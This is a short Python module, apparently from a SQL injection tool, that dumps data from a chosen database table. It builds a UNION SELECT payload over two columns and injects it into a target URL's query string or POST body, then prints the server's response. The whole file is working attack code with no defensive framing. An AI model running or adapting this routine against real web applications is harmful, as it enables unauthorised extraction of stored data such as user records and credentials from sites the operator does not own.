# modules/dump.py
def data(injector, db_name, table_name, columns_str):
    print(f"[+] Dumping data from {db_name}.{table_name} ({columns_str})")
    columns_list = columns_str.split(",")
    select_columns = ", ".join(columns_list[:2])  # keep simple: two columns only for now

    payload = f"' UNION SELECT {select_columns} FROM {db_name}.{table_name}-- -"
    response = inject(injector, payload)
    print(response)

def inject(injector, payload):
    if "?" in injector.url:
        url = injector.url.replace("=", "=" + payload)
        r = injector.session.get(url, headers=injector.headers)
        return r.text
    elif injector.args.method.upper() == "POST":
        post_data = injector.args.data.replace("=", "=" + payload)
        r = injector.session.post(injector.url, data=post_data, headers=injector.headers)
        return r.text
    return "Injection failed"
